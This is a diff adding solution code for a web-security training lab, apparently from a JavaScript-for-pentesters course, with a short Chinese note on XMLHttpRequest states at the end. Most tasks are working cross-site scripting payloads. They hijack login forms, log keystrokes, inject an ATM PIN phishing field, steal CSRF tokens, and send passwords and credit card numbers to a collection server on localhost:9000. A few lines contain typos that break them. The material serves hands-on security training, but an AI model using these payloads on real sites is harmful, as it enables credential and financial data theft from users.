@@ -1,0 +1,385 @@
+Task 1 Solution: Modify HTML with Javascript
+
+<script>
+
+	document.getElementsByTagName("h2")[2].innerHTML = "Modified You";
+	document.getElementsByTagName("h1")[0].innerHTML = "Found You";
+
+</script>
+
+Task 2 Solution: Change All Links  
+
+<script>
+	var links = document.getElementsByTagName("a");
+	
+	for(i=0; i<links.length; i++){
+		links[i].href = "http://localhost:9000";
+		links[i].innerHTML = "Link Modified";
+			
+	}	
+</script>
+
+Task 3 Solution: Hijack Form Submit  
+
+<script>
+
+	function InterceptForm(){
+		var username = document.forms[0].elements[0].value;
+		var password = document.forms[0].elements[1].value;
+		new Image().src = "http://localhost:9000/?username="+username+"&password="+password;
+	}
+
+	document.forms[0].onsubmit = InterceptForm;
+
+</script>
+
+Task 4 Solution: Modify Form Fields  
+
+<script>
+
+	var input = document.createElement("input");
+	input.setAttribute("type", "text");
+	input.setAttribute("class", "input-block-level");
+	input.setAttribute("placeholder", "ATM PIN");
+	input.setAttribute("name", "atmpin");
+
+	var previous = document.forms[0].elements[0];
+	document.forms[0].insertBefore(input, previous);
+	document.forms.action = "http://localhost/";
+
+</script>
+
+Task 5 Solution: Social Engineering  
+
+<script>
+
+	var input = document.createElement('h2');
+
+	input.innderHTML = "Website is Down. Please visit SecurityTube.net";
+
+	document.forms[0].parentNode.appendChild(input);
+
+	document.forms[0].parentNode.removeChild(document.forms[0]);
+
+</script>
+
+Task 6 Solution: Capture All Clicks  
+
+<script>
+
+	function CaughtClick(){
+	   alert("You Clicked");
+	}
+
+	document.body.addEventListener('click', CaughtClick, true)
+
+</script>
+
+****************************************************************
+
+<script>
+
+	function CaughtClick(){
+	   location.href = "http://localhost:9000"
+	}
+
+	document.body.addEventListener('click', CaughtClick, true)
+
+</script>
+
+Task 7 Solution: Keystroke Logging  
+
+<script>
+
+	document.onkeypress = function KeyLogger(inp){
+	   key_pressed = String.fromCharCode(inp.which);
+	   new Image().src = "http://localhost:9000/?" + key_pressed;
+	}
+
+</script>
+
+
+Task 8 Solution: Event Listener  
+
+	" onmouseover= "alert(1);
+
+	document.forms[0].onsubmit = function demo(){
+		var pass = document.forms[0].elements[1].value;
+		alert(pass);
+	}
+
+
+Task 9 Solution: Include External JS  
+
+Step 1. 
+ejtest.js
+
+window.addEventListener("load", function(){alert(document.cookie);});
+
+Step 2.
+
+<script src="http://localhost:9000/ejtest.js"></script>
+
+Task 10 Solution: Include External JS using JS  
+
+Step 1. 
+ejtest.js
+
+window.addEventListener("load", function(){alert(document.cookie);});
+
+Step 2.
+
+	var newtag = document.createElement("script");
+	newtag.type = "text/javascript";
+	newtag.src = "http://localhost:9000/ejtest.js";
+	document.body.appendChild(newtag);
+
+Task 11 Solution: Replace Banner Image  
+
+<script>
+
+	document.getElementsByTagName("img")[0].src = "https://www.google.com/images/srpr/logo11w.png"
+
+</script>
+
+Task 12 Solution: Stealing from Auto-Complete  
+
+<script>
+	window.setTimeout( function(){
+		document.forms[0].action = "http://localhost:9000";
+		document.forms[0].submit();
+	}, 10000);
+</script>
+
+Task 13 Solution: Posting with XMLHttpRequest  
+<script>
+	username = document.forms[0].elements[0].value;
+	password = document.forms[0].elements[1].value;
+    
+	window.setTimeout(function(){
+		alert(username + ':' + password);
+	}, 10000);
+
+</script>
+
+<script>
+
+	username = document.forms[0].elements[0].value;
+	password = document.forms[0].elements[1].value;
+    
+	window.setTimeout(function(){
+		var req = new XMLHttpRequest();
+		req.open("GET", "http://localhost:9000/?username=" + username + "&password=" + password, true);
+	    req.send();
+	}, 10000);
+
+</script>
+
+Task 14 Solution: Fetching Data with XMLHttpRequest  
+
+<script>
+
+	var req = new XMLHttpRequest();
+	req.onreadystatechange = function(){
+		if(req.readyState == 4 && req.status == 200)
+		{
+			document.getElementsById("result").innerHTML = req.responseText;
+		}
+	};
+	req.open("GET", "/lab/webapp/jfp/14/email?name=seris", true);
+	req.send();
+	
+</script>
+
+Task 15 Solution: Data Exfiltration with XMLHttpRequest  
+<script>
+
+	var req = new XMLHttpRequest();
+	req.onreadystatechange = function(){
+		if(req.readyState == 4 && req.status == 200)
+		{
+			alert(req.responseText);
+			new Image().src = "http://localhost:9000/?cardno=" + req.responseText;
+		}
+	};
+
+	req.open("POST", "/lab/webapp/jfp/15/cardstore", true);
+	req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+	req.send("user=seris");
+
+</script>
+
+Task 16 Solution: Extracting CSRF Tokens  
+
+<script>
+
+	var req = new XMLHttpRequest();
+
+	req.onreadystatechange = function(){
+		if(req.readyState==4 && req.status == 200){
+			document.getElementById("result").innerHTML = req.responseText;
+		}
+	}
+
+	var token = window.location.search.split('&')[1];
+
+	alert(token)
+	req.open('GET', "/lab/webapp/jfp/16/email?name=seris&" + token, true);
+	req.send();
+
+</script>
+
+Task 17 Solution: CSRF Token Stealing  
+
+<script>
+	var req = new XMLHttpRequest();
+	req.onreadystatechange = function(){
+		if(req.readyState==4 && req.status==200){
+			document.getElementById("result").innerHTML = req.responseText;
+		}
+	};
+
+	var uid = document.getElementById("uid").innerHTML.split(':')[1];
+	var token = document.getElementById("csrf").innerHTML.split(':')[1];
+
+	req.open("GET", "/lab/webapp/jfp/17/email?uid=" + uid + "&csrf_token=" + token, true);
+	req.send();
+</script>
+
+Task 18 Solution: HTML Parsing of XMLHttpRequest Response  
+<script>
+
+	var req = new XMLHttpRequest();
+
+	req.onreadystatechange = function(){
+		if(req.readyState==4 && req.status==200){
+			var htmlPage = req.responseXML;
+			var address = htmlPage.getElementById("address").innerHTML;
+			alert(address);
+			document.getElementById("result").innerHTML = address;		
+		}
+	};
+
+	req.open("GET", "/lab/webapp/jfp/18/address", true);
+	req.responseType = "document";
+	req.send();
+
+</script>
+
+Task 19 Solution: Multi-Level HTML Parsing  
+
+	var link = document.getElementById("settings");
+	var req = new XMLHttpRequest();
+	var csrf_token = '';
+    var uid = '';	
+	var req2 = new XMLHttpRequest();
+
+	req2.onreadystatechange = function(){
+		if(req2.readyState==4 && req2.status==200)
+		{
+			var htmlPage = req2.responseXML;
+			credit_card = htmlPage.getElementById("result").innerHTML;
+			document.getElementById("result").innerHTML = credit_card;
+			new Image().src = "http://localhost:9000/?credit_card_number =" + credit_card;
+		}
+	}
+	
+	req.onreadystatechange = function(){
+		if(req.readyState==4 && req.status==200)
+		{
+			var htmlPage = req.responseXML;
+			csrf_token = htmlPage.forms[0].elements[1].value;
+			alert(csrf_token);
+			
+			req2.open("GET", "/lab/webapp/jfp/19/getcreditcard?uid=" +uid+ "&csrf_token=" +csrf_token, true);
+			req2.responseType = "document";
+			req2.send();
+		}
+	}
+
+	uid = link.innerHTML.split(':')[1];
+	req.open("GET", link.href, true);
+	req.responseType = "document";
+	req.send();
+
+</script>
+
+
+Task 20 Solution: Multi-Level JSON Parsing  
+
+<script>
+	var link = document.getElementById("settings");
+	var req = new XMLHttpRequest();
+	var token = '';
+	var uid = '';
+	var req2 = new XMLHttpRequest();
+
+	req2.onreadystatechange = function(){
+		if(req2.readyState==4 && req2.status==200)
+		{
+			var pass_obj = JSON.parse(req2.responseText);
+			var password = pass_obj.resp.password;
+			document.getElementById("result").innerHTML = password;
+			new Image().src = "http://localhost:9000/?password="+password+"&uid="+uid;
+		}
+	}
+
+	req.onreadystatechange = function(){
+		if(req.readyState==4 && req.status==200)
+		{
+			response_obj = JSON.parse(req.responseText);
+			token = response_obj.params.token;
+			req2.open("GET", "/lab/webapp/jfp/20/getpassword?token="+token, true);
+			req2.send();
+		}	
+	};
+
+	uid = link.innerHTML.split(':')[1];
+	req.open("GET", "/lab/webapp/jfp/20/gettoken?uid=" + uid, true);
+	req.send();
+
+</script>
+
+Task 21 Solution: Multi-Level XML Parsing  
+
+<script>
+
+	var link = document.getElementById("settings");
+	var req = new XMLHttpRequest();
+	var uid = '';
+	var token = '';
+	var req2 = new XMLHttpRequest();
+
+	req2.onreadystatechange = function(){
+		if(req2.readyState==4 && req2.status==200)
+		{
+			var questions = JSON.parse(req2.responseText);
+			
+			document.getElementById("result").innerHTML = questions.q1 + "<br>" + questions.q2 + "<br>" + questions.q3;
+		}
+	};
+
+	req.onreadystatechange = function(){
+		if(req.readyState==4 && req.status==200){
+			uid = req.responseXML.getElementsByTagName("uid-param-value")[0].childNodes[0].nodeValue;
+			token = req.responseXML.getElementsByTagName("token-param-value")[0].childNodes[0].nodeValue;
+			
+			req2.open("GET", "/lab/webapp/jfp/21/questions?uid=" + uid + "&token=" + token, true);
+			req2.send();
+		}
+	}
+
+	req.open("GET", link.href, true);
+	req.send();
+
+</script>
+
+其他：
+
+XMLHttpRequest 物件的 readyState 屬性表示請求的狀態，它有以下幾個可能的取值：
+
+0 (UNSENT): 請求已創建，但尚未呼叫 open() 方法。
+1 (OPENED): open()方法已經被呼叫。
+2 (HEADERS_RECEIVED): send() 方法已經被調用，並且 header 和狀態已經可獲得。
+3 (LOADING): 下載中，responseText 屬性已經包含部分資料。
+4 (DONE): 下載操作已完成。
